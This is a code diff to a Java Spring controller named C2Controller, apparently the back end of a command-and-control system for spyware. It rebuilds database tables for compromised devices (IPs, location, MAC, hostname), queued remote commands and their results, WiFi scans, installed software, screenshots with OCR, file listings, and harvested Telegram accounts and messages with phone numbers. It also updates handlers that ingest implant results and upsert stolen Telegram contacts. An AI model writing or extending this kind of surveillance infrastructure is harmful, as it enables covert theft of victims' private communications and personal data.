@@ -99,64 +99,152 @@ public class C2Controller {
     @GetMapping("/reset-schema")
     public String resetSchema() {
         try {
-            // Drop tables
+            // 1. Drop all tables
             jdbcTemplate.execute("DROP TABLE IF EXISTS c2_wifi");
             jdbcTemplate.execute("DROP TABLE IF EXISTS c2_software");
-            jdbcTemplate.execute("DROP TABLE IF EXISTS c2_file_scan");
             jdbcTemplate.execute("DROP TABLE IF EXISTS c2_screenshot");
             jdbcTemplate.execute("DROP TABLE IF EXISTS c2_file_system_node");
+            jdbcTemplate.execute("DROP TABLE IF EXISTS c2_task");
+            jdbcTemplate.execute("DROP TABLE IF EXISTS c2_device");
+            jdbcTemplate.execute("DROP TABLE IF EXISTS tg_account");
+            jdbcTemplate.execute("DROP TABLE IF EXISTS tg_message");
+            jdbcTemplate.execute("DROP TABLE IF EXISTS collected_data");
+            // Note: t_user is NOT dropped to prevent locking out the admin. 
+            // If you want to reset users, drop it manually.
+            // jdbcTemplate.execute("DROP TABLE IF EXISTS t_user");
 
-            // C2 WiFi
-            jdbcTemplate.execute("create table if not exists c2_wifi (" +
+            // 2. Create C2 Device
+            jdbcTemplate.execute("create table if not exists c2_device (" +
                     "id bigint auto_increment primary key, " +
-                    "device_uuid varchar(64) not null, " +
-                    "ssid varchar(128) null, " +
-                    "bssid varchar(64) null, " +
-                    "signalStrength varchar(32) null, " +
-                    "authentication varchar(64) null, " +
-                    "createTime datetime default CURRENT_TIMESTAMP not null, " +
-                    "isDelete tinyint default 0 not null, " +
-                    "index idx_device_uuid (device_uuid))");
+                    "uuid varchar(64) null comment 'Unique Device ID', " +
+                    "internal_ip varchar(64) null comment 'Internal IP', " +
+                    "external_ip varchar(64) null comment 'External IP', " +
+                    "country varchar(64) null comment 'Country', " +
+                    "region varchar(64) null comment 'Region', " +
+                    "city varchar(64) null comment 'City', " +
+                    "isp varchar(128) null comment 'ISP', " +
+                    "mac_address varchar(64) null comment 'MAC Address', " +
+                    "host_name varchar(128) null comment 'Hostname', " +
+                    "os varchar(128) null comment 'OS Info', " +
+                    "last_seen datetime null comment 'Last Seen', " +
+                    "heartbeat_interval int default 60000 comment 'Heartbeat Interval', " +
+                    "is_monitor_on tinyint default 0 comment 'Is Monitor On', " +
+                    "current_tg_id varchar(64) null comment 'Current Telegram ID', " +
+                    "data_status varchar(32) null comment 'Data Status', " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null comment 'Create Time', " +
+                    "update_time datetime default CURRENT_TIMESTAMP not null comment 'Update Time', " +
+                    "is_delete tinyint default 0 not null comment 'Is Deleted', " +
+                    "index idx_uuid (uuid))");
 
-            // C2 Software
+            // 3. Create C2 Software
             jdbcTemplate.execute("create table if not exists c2_software (" +
                     "id bigint auto_increment primary key, " +
-                    "device_uuid varchar(64) not null, " +
-                    "name varchar(256) null, " +
-                    "version varchar(128) null, " +
-                    "installDate varchar(64) null, " +
-                    "createTime datetime default CURRENT_TIMESTAMP not null, " +
-                    "isDelete tinyint default 0 not null, " +
+                    "device_uuid varchar(64) not null comment 'Device UUID', " +
+                    "name varchar(256) not null comment 'Software Name', " +
+                    "version varchar(64) null comment 'Version', " +
+                    "install_date varchar(64) null comment 'Install Date', " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null comment 'Create Time', " +
+                    "is_delete tinyint default 0 not null comment 'Is Deleted', " +
                     "index idx_device_uuid (device_uuid))");
 
-            // C2 Screenshot
+            // 4. Create C2 WiFi
+            jdbcTemplate.execute("create table if not exists c2_wifi (" +
+                    "id bigint auto_increment primary key, " +
+                    "device_uuid varchar(64) not null comment 'Device UUID', " +
+                    "ssid varchar(128) not null comment 'SSID', " +
+                    "bssid varchar(64) null comment 'BSSID (MAC)', " +
+                    "signal_strength varchar(32) null comment 'Signal Strength', " +
+                    "authentication varchar(64) null comment 'Authentication', " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null comment 'Create Time', " +
+                    "is_delete tinyint default 0 not null comment 'Is Deleted', " +
+                    "index idx_device_uuid (device_uuid))");
+
+            // 5. Create C2 Task
+            jdbcTemplate.execute("create table if not exists c2_task (" +
+                    "id bigint auto_increment primary key, " +
+                    "task_id varchar(64) not null comment 'Task ID', " +
+                    "device_uuid varchar(64) null comment 'Target Device UUID', " +
+                    "command varchar(256) not null comment 'Command', " +
+                    "params text null comment 'Parameters', " +
+                    "status varchar(32) default 'pending' not null comment 'Status', " +
+                    "result longtext null comment 'Result', " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null comment 'Create Time', " +
+                    "update_time datetime default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment 'Update Time', " +
+                    "is_delete tinyint default 0 not null comment 'Is Deleted', " +
+                    "index idx_task_id (task_id))");
+
+            // 6. Create TG Account
+            jdbcTemplate.execute("create table if not exists tg_account (" +
+                    "id bigint auto_increment primary key, " +
+                    "tg_id varchar(64) null comment 'Telegram ID', " +
+                    "username varchar(128) null comment 'Username', " +
+                    "phone varchar(32) null comment 'Phone', " +
+                    "first_name varchar(128) null comment 'First Name', " +
+                    "last_name varchar(128) null comment 'Last Name', " +
+                    "is_bot tinyint default 0 comment 'Is Bot', " +
+                    "is_premium tinyint default 0 comment 'Is Premium', " +
+                    "system_info text null comment 'System Info', " +
+                    "device_uuid varchar(64) null comment 'Device UUID', " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null comment 'Create Time', " +
+                    "update_time datetime default CURRENT_TIMESTAMP not null on update CURRENT_TIMESTAMP comment 'Update Time', " +
+                    "is_delete tinyint default 0 not null comment 'Is Deleted')");
+
+            // 7. Create TG Message
+            jdbcTemplate.execute("create table if not exists tg_message (" +
+                    "id bigint auto_increment primary key, " +
+                    "account_id bigint not null comment 'Account ID', " +
+                    "msg_id bigint null comment 'Message ID', " +
+                    "chat_id varchar(64) null comment 'Chat ID', " +
+                    "sender_id varchar(64) null comment 'Sender ID', " +
+                    "sender_username varchar(128) null comment 'Sender Username', " +
+                    "sender_phone varchar(32) null comment 'Sender Phone', " +
+                    "receiver_id varchar(64) null comment 'Receiver ID', " +
+                    "receiver_username varchar(128) null comment 'Receiver Username', " +
+                    "receiver_phone varchar(32) null comment 'Receiver Phone', " +
+                    "content text null comment 'Content', " +
+                    "msg_type varchar(32) null comment 'Message Type', " +
+                    "media_path varchar(256) null comment 'Media Path', " +
+                    "msg_date datetime null comment 'Message Date', " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null comment 'Create Time', " +
+                    "is_delete tinyint default 0 not null comment 'Is Deleted')");
+
+            // 8. Create C2 Screenshot
             jdbcTemplate.execute("create table if not exists c2_screenshot (" +
                     "id bigint auto_increment primary key, " +
-                    "device_uuid varchar(64) not null, " +
-                    "task_id varchar(64) null, " +
-                    "url varchar(512) null, " +
-                    "ocr_result text null, " +
-                    "create_time datetime default CURRENT_TIMESTAMP not null, " +
-                    "is_delete tinyint default 0 not null, " +
+                    "device_uuid varchar(64) not null comment 'Device UUID', " +
+                    "task_id varchar(64) null comment 'Task ID', " +
+                    "url varchar(512) null comment 'URL', " +
+                    "ocr_result text null comment 'OCR Result', " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null comment 'Create Time', " +
+                    "is_delete tinyint default 0 not null comment 'Is Deleted', " +
                     "index idx_device_uuid (device_uuid))");
 
-            // C2 File System Node
+            // 9. Create C2 File System Node
             jdbcTemplate.execute("create table if not exists c2_file_system_node (" +
                     "id bigint auto_increment primary key, " +
-                    "device_uuid varchar(64) not null, " +
-                    "parent_path varchar(512) null, " +
-                    "path varchar(512) null, " +
-                    "name varchar(256) null, " +
-                    "is_directory tinyint default 0 null, " +
-                    "size bigint null, " +
-                    "md5 varchar(64) null, " +
-                    "is_recent tinyint default 0 null, " +
-                    "last_modified datetime null, " +
-                    "create_time datetime default CURRENT_TIMESTAMP not null, " +
-                    "is_delete tinyint default 0 not null, " +
+                    "device_uuid varchar(64) not null comment 'Device UUID', " +
+                    "parent_path text null comment 'Parent Path', " +
+                    "name varchar(256) not null comment 'Name', " +
+                    "path text not null comment 'Full Path', " +
+                    "is_directory tinyint default 0 not null comment 'Is Directory', " +
+                    "size bigint default 0 not null comment 'Size', " +
+                    "md5 varchar(32) null comment 'MD5 Hash', " +
+                    "is_recent tinyint default 0 not null comment 'Is Recently Modified', " +
+                    "last_modified datetime null comment 'Last Modified', " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null comment 'Create Time', " +
+                    "is_delete tinyint default 0 not null comment 'Is Deleted', " +
                     "index idx_device_uuid (device_uuid))");
+            
+            // 10. Create Collected Data
+            jdbcTemplate.execute("create table if not exists collected_data (" +
+                    "id bigint auto_increment primary key, " +
+                    "data_id varchar(64) not null comment 'Data ID', " +
+                    "data_type varchar(32) not null comment 'Data Type', " +
+                    "content longtext null comment 'Content (Base64 or Text)', " +
+                    "create_time datetime default CURRENT_TIMESTAMP not null comment 'Create Time', " +
+                    "is_delete tinyint default 0 not null comment 'Is Deleted')");
 
-            return "Schema reset successfully";
+            return "Schema reset successfully (except t_user)";
         } catch (Exception e) {
             log.error("Schema reset failed", e);
             return "Failed: " + e.getMessage();
@@ -481,6 +569,9 @@ public class C2Controller {
 
         recordHeartbeat(payload, request); // Pass payload to update heartbeat info
         String taskId = (String) payload.get("taskId");
+        if (taskId == null) {
+            taskId = (String) payload.get("task_id");
+        }
         String result = (String) payload.get("result");
         String status = (String) payload.get("status"); // Support status update
 
@@ -539,9 +630,7 @@ public class C2Controller {
 
                             if (StringUtils.isNotBlank(userId)) {
                                 // 1. Update/Insert TgAccount
-                                QueryWrapper<TgAccount> tgQuery = new QueryWrapper<>();
-                                tgQuery.eq("tgId", userId);
-                                TgAccount tgAccount = tgAccountMapper.selectOne(tgQuery);
+                                TgAccount tgAccount = tgAccountMapper.selectOne(new QueryWrapper<TgAccount>().eq("tg_id", userId));
                                 
                                 if (tgAccount == null) {
                                     tgAccount = new TgAccount();
@@ -1655,9 +1744,9 @@ public class C2Controller {
                          String phone = rs.getString("phone");
                          
                          // Upsert TgAccount
-                         TgAccount account = tgAccountMapper.selectOne(new QueryWrapper<TgAccount>().eq("tgId", contactId));
-                         if (account == null) {
-                             account = new TgAccount();
+                        TgAccount account = tgAccountMapper.selectOne(new QueryWrapper<TgAccount>().eq("tg_id", contactId));
+                        if (account == null) {
+                            account = new TgAccount();
                              account.setTgId(contactId);
                              account.setUsername(username);
                              account.setFirstName(firstName);
@@ -1829,9 +1918,7 @@ public class C2Controller {
                     
                     // Filter excluded tables
                     List<String> processedTables = java.util.Arrays.asList(
-                        "system_info", "wifi_scan_results", "installed_software", 
-                        "chat_logs", "current_user", "files", "file_scan_results", 
-                        "contacts", "chat_sync_state", "local_tasks", "android_metadata"
+                        "chat_sync_state", "local_tasks"
                     );
                     
                     for (String tableName : allTables) {
